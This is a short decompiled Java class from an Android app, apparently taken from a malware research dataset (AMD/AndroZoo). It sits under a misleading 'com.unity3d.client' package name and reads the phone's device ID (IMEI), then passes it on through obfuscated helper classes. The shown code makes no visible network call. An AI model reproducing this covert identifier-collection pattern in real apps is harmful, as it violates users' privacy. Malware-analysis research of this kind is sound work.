package com.unity3d.client;

import android.content.Context;
import android.os.Looper;
import android.telephony.TelephonyManager;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/cda1bec27e663b5b512c108d4427c257.apk/classes.dex */
public class InfoManage {
    private static InfoManage c = null;
    private static String d = null;
    public static Context a = null;
    public static b b = null;

    public static String a() {
        return d;
    }

    public static InfoManage getInstance(Context context) {
        return getInstance(context, d);
    }

    public static InfoManage getInstance(Context context, String str) {
        if (c == null) {
            c = new InfoManage();
            b = new b(Looper.myLooper(), context);
            d = str;
        }
        c.a = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        a = context;
        return c;
    }

    public void recinfo() {
        c.b(a, d);
    }
}
